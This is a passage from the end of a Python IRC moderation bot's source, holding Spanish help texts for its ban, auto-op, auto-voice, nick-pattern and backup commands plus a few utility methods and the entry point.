                f"\x031Por ejemplo \x0312/msg {n} ayuda nick add",
            ],
            "nick add": [
                f"\x0310- Ayuda del comando NICK ADD -",
                "\x031 ",
                f"\x031Para agregar un patrón de nick no permitido debes escribir \x0312/msg {n} nick add <#canal> <patron>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el canal, por ejemplo \x0312{pral}",
                f"\x031Donde pone \x0312<patron>\x03 debes indicar el patrón, por ejemplo \x0312Pep?t*",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} nick add {pral} Pep?t*",
                "\x031 ",
                f"\x034NOTA:\x031 el patrón puede contener los comodines \x0312?\x031 y \x0312*",
            ],
            "nick del": [
                f"\x0310- Ayuda del comando NICK DEL -",
                "\x031 ",
                f"\x031Para eliminar un patrón de nick no permitido debes escribir \x0312/msg {n} nick del <#canal> <patron>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el canal, por ejemplo \x0312{pral}",
                f"\x031Donde pone \x0312<patron>\x03 debes indicar el patrón a eliminar, por ejemplo \x0312Pep?t*",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} nick del {pral} Pep?t*",
                "\x031 ",
                f"\x034NOTA:\x031 el patrón puede contener los comodines \x0312?\x031 y \x0312*",
            ],
            "nick list": [
                f"\x0310- Ayuda del comando NICK LIST -",
                "\x031 ",
                f"\x031Para ver la lista de patrones de nicks no permitidos debes escribir \x0312/msg {n} nick list <#canal>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el canal, por ejemplo \x0312{pral}",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} nick list {pral}",
            ],
            "enick": [
                f"\x0310- Ayuda del comando ENICK -",
                "\x031 ",
                f"\x0312ADD\x03 Sirve para agregar un nick como excepción de escaneo.",
                f"\x0312DEL\x03 Sirve para eliminar un nick de la excepción de escaneo.",
                f"\x0312LIST\x03 Sirve para listar los nicks exentos de escaneo.",
                f"\x0312TEST\x03 Sirve para probar si un nick está exento de escaneo.",
                "\x031 ",
                f"\x031Para más información escribe \x0312/msg {n} ayuda enick <opcion>",
                f"\x031Por ejemplo \x0312/msg {n} ayuda enick add",
            ],
            "enick add": [
                f"\x0310- Ayuda del comando ENICK ADD -",
                "\x031 ",
                f"\x031Para agregar un nick no escaneado debes escribir \x0312/msg {n} enick add <#canal> <nick>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el canal, por ejemplo \x0312{pral}",
                f"\x031Donde pone \x0312<nick>\x03 debes indicar el nick que agregarás, por ejemplo \x0312Pepito",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} enick add {pral} Pepito",
            ],
            "enick del": [
                f"\x0310- Ayuda del comando ENICK DEL -",
                "\x031 ",
                f"\x031Para eliminar un nick no escaneado debes escribir \x0312/msg {n} enick del <#canal> <nick>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el canal, por ejemplo \x0312{pral}",
                f"\x031Donde pone \x0312<nick>\x03 debes indicar el nick a eliminar, por ejemplo \x0312Pepito",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} enick del {pral} Pepito",
            ],
            "enick list": [
                f"\x0310- Ayuda del comando ENICK LIST -",
                "\x031 ",
                f"\x031Para ver la lista de nicks no escaneados debes escribir \x0312/msg {n} enick list <#canal>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el canal, por ejemplo \x0312{pral}",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} enick list {pral}",
            ],
            "enick test": [
                f"\x0310- Ayuda del comando ENICK TEST -",
                "\x031 ",
                f"\x031Para probar si un nick está exento de escaneo debes escribir \x0312/msg {n} enick test <#canal> <nick>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el canal, por ejemplo \x0312{pral}",
                f"\x031Donde pone \x0312<nick>\x03 debes indicar el nick a comprobar, por ejemplo \x0312Pepito",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} enick test {pral} Pepito",
            ],
            "ibl": [
                f"\x0310- Ayuda del comando IBL -",
                "\x031 ",
                f"\x0312ADD\x03 Sirve para agregar un ban permanente.",
                f"\x0312DEL\x03 Sirve para eliminar un ban permanente.",
                "\x031 ",
                f"\x031Para más información escribe \x0312/msg {n} ayuda ibl <opcion>",
                f"\x031Por ejemplo \x0312/msg {n} ayuda ibl add",
            ],
            "ibl add": [
                f"\x0310- Ayuda del comando IBL ADD -",
                "\x031 ",
                f"\x031Para agregar un ban permanente debes escribir \x0312/msg {n} ibl add <#canal> <mask>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el canal, por ejemplo \x0312{pral}",
                f"\x031Donde pone \x0312<mask>\x03 debes indicar la máscara de ban, por ejemplo \x0312*!*@*.dominio.com",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} ibl add {pral} *!*@*.dominio.com",
                "\x031 ",
                f"\x034NOTA:\x031 Formatos válidos: 1.2.3.4 | 1.2.3 | fragmento.IP | *!*@*.dominio.com",
            ],
            "ibl del": [
                f"\x0310- Ayuda del comando IBL DEL -",
                "\x031 ",
                f"\x031Para eliminar un ban permanente debes escribir \x0312/msg {n} ibl del <#canal> <mask>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el canal, por ejemplo \x0312{pral}",
                f"\x031Donde pone \x0312<mask>\x03 debes indicar la máscara de ban a eliminar.",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} ibl del {pral} *!*@*.dominio.com",
            ],
            "autoop": [
                f"\x0310- Ayuda del comando AUTOOP -",
                "\x031 ",
                f"\x0312ADD\x03 Sirve para agregar una máscara de autoop.",
                f"\x0312DEL\x03 Sirve para eliminar una máscara de autoop.",
                f"\x0312LIST\x03 Sirve para listar las máscaras de autoop.",
                "\x031 ",
                f"\x031Para más información escribe \x0312/msg {n} ayuda autoop <opcion>",
                f"\x031Por ejemplo \x0312/msg {n} ayuda autoop add",
            ],
            "autoop add": [
                f"\x0310- Ayuda del comando AUTOOP ADD -",
                "\x031 ",
                f"\x031Para agregar una máscara de autoop debes escribir \x0312/msg {n} autoop add <#canal> <mascara>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el canal, por ejemplo \x0312{pral}",
                f"\x031Donde pone \x0312<mascara>\x03 debes indicar la máscara, por ejemplo \x0312*!*@tu.vhost.com",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} autoop add {pral} *!*@tu.vhost.com",
            ],
            "autoop del": [
                f"\x0310- Ayuda del comando AUTOOP DEL -",
                "\x031 ",
                f"\x031Para eliminar una máscara de autoop debes escribir \x0312/msg {n} autoop del <#canal> <mascara>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el canal, por ejemplo \x0312{pral}",
                f"\x031Donde pone \x0312<mascara>\x03 debes indicar la máscara a eliminar.",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} autoop del {pral} *!*@tu.vhost.com",
            ],
            "autoop list": [
                f"\x0310- Ayuda del comando AUTOOP LIST -",
                "\x031 ",
                f"\x031Para ver la lista de máscaras de autoop debes escribir \x0312/msg {n} autoop list <#canal>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el canal, por ejemplo \x0312{pral}",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} autoop list {pral}",
            ],
            "avoice": [
                f"\x0310- Ayuda del comando AVOICE -",
                "\x031 ",
                f"\x0312ADD\x03 Sirve para agregar una máscara de avoice.",
                f"\x0312DEL\x03 Sirve para eliminar una máscara de avoice.",
                f"\x0312LIST\x03 Sirve para listar las máscaras de avoice.",
                "\x031 ",
                f"\x031Para más información escribe \x0312/msg {n} ayuda avoice <opcion>",
                f"\x031Por ejemplo \x0312/msg {n} ayuda avoice add",
            ],
            "avoice add": [
                f"\x0310- Ayuda del comando AVOICE ADD -",
                "\x031 ",
                f"\x031Para agregar una máscara de avoice debes escribir \x0312/msg {n} avoice add <#canal> <mascara>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el canal, por ejemplo \x0312{pral}",
                f"\x031Donde pone \x0312<mascara>\x03 debes indicar la máscara, por ejemplo \x0312*!*@tu.vhost.com",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} avoice add {pral} *!*@tu.vhost.com",
            ],
            "avoice del": [
                f"\x0310- Ayuda del comando AVOICE DEL -",
                "\x031 ",
                f"\x031Para eliminar una máscara de avoice debes escribir \x0312/msg {n} avoice del <#canal> <mascara>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el canal, por ejemplo \x0312{pral}",
                f"\x031Donde pone \x0312<mascara>\x03 debes indicar la máscara a eliminar.",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} avoice del {pral} *!*@tu.vhost.com",
            ],
            "avoice list": [
                f"\x0310- Ayuda del comando AVOICE LIST -",
                "\x031 ",
                f"\x031Para ver la lista de máscaras de avoice debes escribir \x0312/msg {n} avoice list <#canal>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el canal, por ejemplo \x0312{pral}",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} avoice list {pral}",
            ],
            "rango": [
                f"\x0310- Ayuda del comando RANGO -",
                "\x031 ",
                f"\x0312ADD\x03 Sirve para agregar un canal a la supervisión de rango de IP.",
                f"\x0312DEL\x03 Sirve para eliminar un canal de la supervisión de rango de IP.",
                f"\x0312LIST\x03 Sirve para listar los canales supervisados.",
                "\x031 ",
                f"\x031Para más información escribe \x0312/msg {n} ayuda rango <opcion>",
                f"\x031Por ejemplo \x0312/msg {n} ayuda rango add",
            ],
            "backup": [
                f"\x0310- Ayuda del comando BACKUP -",
                "\x031 ",
                f"\x031Para crear un ZIP con toda la base de datos escribe \x0312/msg {n} backup",
                f"\x031El bot te enviará el archivo comprimido por privado.",
            ],
            "join": [
                f"\x0310- Ayuda del comando JOIN -",
                "\x031 ",
                f"\x031Para meter al bot en un canal escribe \x0312/msg {n} join <#canal>",
                f"\x031Donde pone \x0312<#canal>\x03 escribirás el nombre del canal, por ejemplo \x0312{pral}",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} join {pral}",
            ],
            "restart": [
                f"\x0310- Ayuda del comando RESTART -",
                "\x031 ",
                f"\x031Para reiniciar el bot escribe \x0312/msg {n} restart",
                "\x031 ",
                f"\x034NOTA:\x031 Este comando solo está disponible para administradores.",
            ],
        }

        for linea in ayuda.get(clave, ayuda.get(sub, ayuda[""])):
            l(linea)
    # Utilidades

    def _lista_notice(self, nick: str, titulo: str, items: List[str],
                      vacia: str = "Lista vacia.", por_linea: int = 4) -> None:
        """Envía lista por NOTICE en hilo daemon para no bloquear el reactor."""
        dest = getattr(self, "_pm_target", nick) or nick
        if not items:
            self.pm(dest, vacia)
            return

        def _enviar() -> None:
            self.pm(dest, titulo)
            time.sleep(0.3)
            grupos = [items[i:i + por_linea] for i in range(0, len(items), por_linea)]
            for idx, grupo in enumerate(grupos):
                self.pm(dest, "  \x0312·\x03 ".join(grupo))
                if idx < len(grupos) - 1:
                    time.sleep(0.5)

        threading.Thread(target=_enviar, daemon=True).start()

    def _validar_canal_registrado(self, nick: str, canal: str) -> bool:
        if not canal.startswith("#") or len(canal) < 2:
            self.pm(nick, "\x034¡Error!\x03 El nombre del canal debe ir precedido por el caracter \x0312#\x03")
            return False
        # El canal principal siempre es válido, nunca pasa por la BD
        if canal.lower() == self.cfg.canal_principal.lower():
            return True
        if not self.db.global_existe("canales.dat", canal):
            self.pm(nick, "\x034¡Error!\x03 El canal no se encuentra registrado en la BD del Bot.")
            return False
        return True

# ENTRY POINT

if __name__ == "__main__":
    BASE_DIR = Path(__file__).parent
    _configurar_logging(BASE_DIR)
    cfg = _cargar_config()
    bot = IRCBot(cfg, BASE_DIR)
    bot.run()